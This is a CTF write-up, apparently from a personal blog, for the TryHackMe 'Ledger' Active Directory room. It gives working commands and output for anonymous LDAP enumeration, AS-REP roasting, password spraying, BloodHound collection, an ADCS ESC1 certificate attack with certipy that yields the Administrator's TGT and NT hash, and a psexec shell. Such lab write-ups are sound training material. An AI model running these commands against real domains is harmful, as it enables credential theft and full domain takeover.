---
title: Ledger
categories: [TryHackMe]
tags: [windows, ldap, kerberos, smb, nmap, impacket, kerbrute, bloodhound, netexec]
media_subpath: /images/tryhackme_ledger/
image:
  path: 'https://tryhackme-images.s3.amazonaws.com/room-icons/78aa83616ded14aad892e05c15cc9eb2.png'
---

# Summary

[Ledger](https://tryhackme.com/room/ledger) is a Hard Windows machine that focuses on Active Directory enumeration and exploitation. At first we are presented with lots of possible attack vectors. At first, we enumerated the given host that indicated to us that we were dealing with a `Domain controller` because of the `kerberos`, `LDAP`, `DNS` services running. Taking a look at the `LDAP` services, we discovered that it allowed an [anonymous bind](/theory/protocols/ldap/#anonymous-bind) on the server, making it possible to enumerate the domain objects. With it, we found two accounts that had their passwords on the `description` field. Enumerating which groups they are member of, we discoverd the group `CERTIFICATE SERVICE DCOM ACCESS@THM.LOCAL`, showing us that there is possible a `Certificate Service` running on this AD environment, where we could try to look for some [`ADCS`](/theory/windows/AD/adcs) attacks. Using the `certipy` tool we can find a template vulnerable to [`ESC1`](/theory/windows/AD/adcs#esc1), giving us the possibility to craft a `TGT` for the `Administrator` user, and with that, extract its `NTLM` hash, but since this user is member of the `Protected Users` group, we can't directly login using the `NTLM` hash since this group disallows `NTLM` authentication for its members, so we need to authenticate via [`Kerberos`](/theory/protocols/kerberos), and with the `TGT` or the `hash` we can authenticate on the box as `Adminsitrator`.

---


## Nmap 

We started of as always with an `nmap` scan to list the services running on the machine

```bash
sudo nmap -sVC -p- -Pn -oN nmap
```

Which revealed to us the following **relevant** ports

```bash
cat ~/THM/Ledger/nmap | grep open

53/tcp    open  domain        syn-ack Simple DNS Plus
80/tcp    open  http          syn-ack Microsoft IIS httpd 10.0
88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2025-05-13 20:31:55Z)
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: thm.local0., Site: Default-First-Site-Name)
443/tcp   open  ssl/http      syn-ack Microsoft IIS httpd 10.0
445/tcp   open  microsoft-ds? syn-ack
464/tcp   open  kpasswd5?     syn-ack
593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack Microsoft Windows Active Directory LDAP (Domain: thm.local0., Site: Default-First-Site-Name)
3268/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: thm.local0., Site: Default-First-Site-Name)
3269/tcp  open  ssl/ldap      syn-ack Microsoft Windows Active Directory LDAP (Domain: thm.local0., Site: Default-First-Site-Name)
3389/tcp  open  ms-wbt-server syn-ack Microsoft Terminal Services
```

### Nmap Scripts

From the `nmap` scripts, we gather the following relevant pieces of information:

- **Domain and FQDN of the host**: from the `ldap` enumeration script we can see the `FQDN` as `labyrinth.thm.local` and the domain as `thm.local`

```bash
<SNIP>
389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: thm
.local0., Site: Default-First-Site-Name)
|_ssl-date: 2025-05-13T20:34:11+00:00; -2s from scanner time.
| ssl-cert: Subject: commonName=labyrinth.thm.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:labyrinth.t
hm.local
| Issuer: commonName=thm-LABYRINTH-CA/domainComponent=thm
<SNIP>
```

We then set our `/etc/hosts` file with this information

```bash
cat /etc/hosts
10.10.152.141 labyrinth.thm.local thm.local
```

## (139 - 445) SMB
Trying to use guest authentication on `netexec` by sending a non existent user name and a blank pessword we can see that the we only have read privileges over the `IPC$` share
![NON](file-20250513204130337.png)
## (389,636,3268,3269) LDAP

Trying to perform an [`anonymous bind`](/theory/protocols/ldap#anonymous-bind), we can successfully query the `LDAP` services, and with that, enumerate the `AD` environment

One common misconfiguration on an AD environment is setting sensitive information on the `description` field of an object, we can search for the description fields with the following command 

```bash
ldapsearch -LLL -H ldap://labyrinth.thm.local -D "" -b "DC=thm,DC=local" "(|(objectClass=person)(objectClass=user))" description |sort -u | grep -v dn

description: Please change it: <REDACTED>
description: Tier 1 User
# refldap://DomainDnsZones.thm.local/DC=DomainDnsZones,DC=thm,DC=local
# refldap://ForestDnsZones.thm.local/DC=ForestDnsZones,DC=thm,DC=local
# refldap://thm.local/CN=Configuration,DC=thm,DC=local
```

If the user hasn't changed the password yet, we have now control over that account, to pinpoint the user with this description we can simply grep for this description or filter it with the `LDAP` query `(description=Please change it: <REDACTED>)`

```bash
ldapsearch -LLL -H ldap://labyrinth.thm.local -D "" -b "DC=thm,DC=local" '(description=Please change it: <REDACTED>)' samaccountname description

dn: CN=IVY_WILLIS,OU=HRE,OU=Tier 1,DC=thm,DC=local
description: Please change it: CHANGEME2023!
sAMAccountName: IVY_WILLIS

dn: CN=SUSANNA_MCKNIGHT,OU=Test,OU=ITS,OU=Tier 1,DC=thm,DC=local
description: Please change it: CHANGEME2023!
sAMAccountName: SUSANNA_MCKNIGHT
```

We could also have enumerated the `LDAP` service with the `netexec` tool using the command 

```bash
nxc ldap labyrinth.thm.local -u "nonexist" -p "" --users
```

Which will bring us the username as well as the description

![NON](file-20250513205232457.png)

Before enumerating any further, I want to show some of other enumerations that I had done and found something but it was not much useful for the solving this machine:

----

# Wandering Off 
## Kerberos

We can enumerate  users with `kerberos pre-authentication` disabled, which enables us to perform an [`AS-REP ROAST`](/theory/protocols/kerberos#as-rep-roast-attack) attack, using `impacket getnpusers` as follows:

```bash
GetNPUsers.py -dc-ip 10.10.152.141 thm.local/
```

![NON](file-20250513205721011.png)

We can request the `AS-REP` for the `DC` by setting the `-request` flag and we can specify that we want it in `hashcat` format, which is our go-to tool for cracking hashes

![NON](file-20250513205755387.png)

I couldn't crack any of these hashses using the `rockyou` wordlist.

Spraying the found password on the list of users could prove beneficial, we could find other users that could have that same password on the `AD`, which sadly it wasn't the case here, leaving us with only the following credentials

 ```bash
nxc smb labyrinth.thm.local -u users -p 'CHANGEME2023!' --continue-on-success
<SNIP>
SMB         10.10.152.141   445    LABYRINTH        [+] thm.local\IVY_WILLIS:CHANGEME2023!
SMB         10.10.152.141   445    LABYRINTH        [+] thm.local\SUSANNA_MCKNIGHT:CHANGEME2023!
<SNIP>
```

---

# Getting Back On The Right Path

For better enumeration of all of the environment, we used the `bloodhound-ce` tool for analysis and the `bloodhound-ce-python` for gathering the data

```bash
bloodhound-ce-python -d thm.local -ns 10.10.174.91 -dc labyrinth.thm.local --zip -c all -u "SUSANNA_MCKNIGHT" -p 'CHANGEME2023!'
```

![NON](file-20250514011203342.png)

Enumerating the groups for the users that we have control, we can see that we are member of `CERTIFICATE SERVICE DCOM ACCESS`, which indicates that there is a `Certificate Service` running on the target host

![[file-20250514011356337.png]]

## ADCS

Enumerating the [`ADCS`](/theory/windows/AD/adcs) with `certipy`, we find a certificate vulnerable to [`ESC1`](/theory/windows/AD/adcs#esc1), which lets us 

```bash
Certificate Templates

Template Name                       : ServerAuth
Display Name                        : ServerAuth
Certificate Authorities             : thm-LABYRINTH-CA
Enabled                             : True
<SNIP>
[!] Vulnerabilities
ESC1                              : 'THM.LOCAL\\Domain Computers' and 'THM.LOCAL\\Authenticated Users' can enroll, enrollee supplies subject and template allows client authentication
<SNIP>
```

> PS: There is another template vulnerable to `ESC1` on the `certipy` output, but the template is not enabled like this one, so we used the `ServerAuth` template for the attack

### Attacking ESC1

```bash
certipy req -u SUSANNA_MCKNIGHT@thm.local -p 'CHANGEME2023!' -ca 'thm-LABYRINTH-CA' -template 'ServerAuth' -upn 'administrator@thm.local'
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error: The NETBIOS connection with the remote host timed out.
[-] Use -debug to print a stacktrace

certipy req -u SUSANNA_MCKNIGHT@thm.local -p 'CHANGEME2023!' -ca 'thm-LABYRINTH-CA' -template 'ServerAuth' -upn 'administrator@thm.local'
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 25
[*] Got certificate with UPN 'administrator@thm.local'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx'

certipy auth -pfx ./administrator.pfx
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@thm.local
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@thm.local': aad3b435b51404eeaad3b435b51404ee:<REDACTED>

```

> With `certipy` tool it is pretty normal to receive the first error of `NETBIOS` timeout, we just need to run the command until we don't receive a timeout

After acquiring the `administrator` hash, we can try to check if we have our privileged access with `nxc`, where we received the error `STATUS_ACCOUNT_RESTRICTION`, telling us that the account has restrictions implemented, my first guess would be that the user is a member of `Protected Users` group, a built-in security group on AD that disables `NTLM` authentication of the users, forcing them to only authenticate via `kerberos`, we can confirm that by looking at the `bloodhound` output

![NON](file-20250514012935730.png)

So, to authenticate, we can only do it via `kerberos`, `nxc` has a parameter `-k` for `kerberos` authentication

![NON](file-20250514012655844.png)

To get a shell, we can invoke the `psexec.py` from `impacket`

![NON](file-20250513220011059.png)
